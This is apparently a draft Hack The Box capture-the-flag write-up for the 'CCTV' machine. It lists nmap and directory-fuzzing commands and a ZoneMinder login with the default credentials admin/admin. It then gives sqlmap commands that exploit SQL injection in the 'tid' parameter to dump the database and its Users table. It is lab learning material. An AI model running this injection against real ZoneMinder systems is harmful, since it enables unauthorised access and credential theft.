---
# Imported from Obsidian: HTB/CCTV.md
# Draft: HTB: publish only retired machines
title: CCTV
category: Boot2Root
ctf: Hack The Box
date: 2026-04-10
summary: ZoneMinder default credentials admin/admin
tags:
- boot2root
- hack-the-box
- htb
- linux
lang: fr
draft: true
imported: true
---

```
 nmap -sC -sV 10.129.30.183 
```

![Screenshot](./images/obsidian/cctv/pasted-image-20260410003855.png)

```
 ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cctv.htb/FUZZ -ic
 
  gobuster dir -u http://cctv.htb/ -w /usr/share/wordlists/dirb/common.txt
```

![Screenshot](./images/obsidian/cctv/pasted-image-20260410005115.png)

ZoneMinder default credentials 
**admin/admin**

![Screenshot](./images/obsidian/cctv/pasted-image-20260410004837.png)

Version de Zoneminder :  **v1.37.63**

```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=g4l0d23jcepvfmrpkpdnt0fm5m" -p tid --dbms=mysql --batch --dbs

```

```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=g4l0d23jcepvfmrpkpdnt0fm5m" -p tid --dbms=mysql --batch -D zm -T Users --dump

```

```
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --cookie="ZMSESSID=g4l0d23jcepvfmrpkpdnt0fm5m" -p tid --dbms=mysql --batch -D zm -T Users --dump

```
